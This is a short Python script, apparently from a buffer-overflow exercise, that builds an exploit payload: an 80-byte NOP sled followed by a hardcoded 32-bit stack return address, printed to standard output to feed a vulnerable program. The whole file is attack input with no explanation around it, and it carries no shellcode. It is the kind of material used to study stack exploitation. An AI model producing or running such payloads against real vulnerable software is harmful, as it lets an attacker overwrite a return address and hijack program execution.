nops = "\x90" * 80

adresse_buffer = "\xb0\xfd\xff\xbf"

payload = nops + adresse_buffer

import sys
sys.stdout.write(payload)